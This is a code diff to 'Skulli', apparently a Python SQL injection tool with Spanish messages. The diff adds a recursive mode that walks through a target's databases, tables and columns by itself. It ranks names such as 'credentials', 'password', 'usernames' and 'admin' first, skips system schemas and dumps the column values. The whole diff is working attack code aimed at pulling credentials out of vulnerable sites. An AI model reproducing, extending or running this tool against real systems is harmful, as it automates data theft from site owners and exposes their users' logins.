@@ -48,6 +48,8 @@ class Skulli:
         self.recursive = recursive
         self.characters = string.ascii_letters + string.digits + '_-$#@!.,<>?;:* '
         self.old_data = self.data[self.skll]
+        self.good_words = ['login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id']
+
         
     def create_log(self,header,logs,separator=','):
         log_name = f'{self.log}.txt'
@@ -63,21 +65,33 @@ class Skulli:
     def set_options(self,options):
         if type(options) != list:
             list_options = options.split(',')
+        else:
+            list_options = options.copy()
         lower_options = [word.lower() for word in list_options]
-        good_words = ['test','users', 'login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id']
         
         if len(options) == 1:
             return 0
         
-        for word in good_words:
+        for word in self.good_words:
             if word in lower_options:
                 index = lower_options.index(word)
-                good_words.pop(index)
-                return index
+                self.good_words.pop(index)
+                
+                return index,list_options
+        
+        old_options = list_options.copy()
+        bad_words = ['information_schema', 'performance_schema', 'mysql']
+        
+        for option in old_options:
+            if option not in bad_words:
+                index = list_options.index(option)
+                list_options.pop(index)
+                return index,list_options
         
         return self.which_options(options)
 
     def which_options(self,options):
+        
         if type(options) != list:
             options = options.split(',')
             
@@ -101,12 +115,52 @@ class Skulli:
                 break
         return select_option,old_options,options
 
-    def length_value(self, length):
-        if length == None and not self.automatic:
-            print('Ocurrio un error, puede que no tenga permisos para leer esa base de datos/tabla/columna. Elija otra opcion')
-            return None
-        else:
-            return length
+    def recursion(self):
+        len1 = self.get_databases_len()
+        databases = self.get_databases(len1)
+        while True:
+            option1,new_dbs = self.set_options(databases)
+            old_dbs = databases.split(',')
+            database = old_dbs[option1]
+            
+            print('\n')
+
+            len2 = self.get_tables_len(database)
+            print(database)
+            if len2 == None:
+                print(f'[!] Ocurrio un error en ({database}), puede que no tenga permisos para esa base de datos/tabla/columna')
+            
+                while True:
+                    option1,new_dbs = self.set_options(old_dbs)
+                    database = new_dbs[option1]
+                    old_dbs = new_dbs
+
+                    print('\n')
+
+                    len2 = self.get_tables_len(database)
+                    print(database)
+                    if len2 == None:
+                        print(f'[!] Ocurrio un error en ({database}), puede que no tenga permisos para esa base de datos/tabla/columna, elija otra')
+                        continue
+                    else:
+                        tables = self.get_tables(self.get_tables_len(database), database)
+                        old_tbs = tables.split(',')
+                        break
+                option2,new_tbs = self.set_options(old_tbs)
+                table = old_tbs[option2]
+            tables = self.get_tables(self.get_tables_len(database), database)
+            old_tbs = tables.split(',')
+            option2,new_tbs = self.set_options(old_tbs)
+            table = old_tbs[option2]
+
+            print('\n')
+
+            columns = self.get_columns(self.get_columns_len(database,table), database, table)
+            columns = columns.replace(',', ",0x3a,")
+
+            print('\n')
+
+            self.get_values(self.get_values_len(database,table,columns),database,table,columns)
 
     def condition_of_request(self, match):
         if match.isdigit():
@@ -154,7 +208,6 @@ class Skulli:
                         ln = i
                         break
         self.data[self.skll] = self.old_data
-        self.length_value(ln)
         return ln
 
     def get_databases(self,db_len):
@@ -294,7 +347,6 @@ class Skulli:
                         break
         self.data[self.skll] = self.old_data
         
-        self.length_value(ln)
         return ln
 
     def get_columns(self, cl_len, db, table):
@@ -363,7 +415,6 @@ class Skulli:
                         break
         self.data[self.skll] = self.old_data
         
-        self.length_value(ln)
         return ln
 
     def get_values(self, vl_len, db, table, columns):
@@ -420,6 +471,8 @@ class Skulli:
     def initial(self):
         p1 = print('[+] Iniciando SkullI')
         time.sleep(2)
+        if self.recursive:
+            self.recursion()
         len1 = self.get_databases_len()
         databases = self.get_databases(len1)
         option1,old_dbs,new_dbs = self.which_options(databases) if not self.automatic else self.set_options(databases)
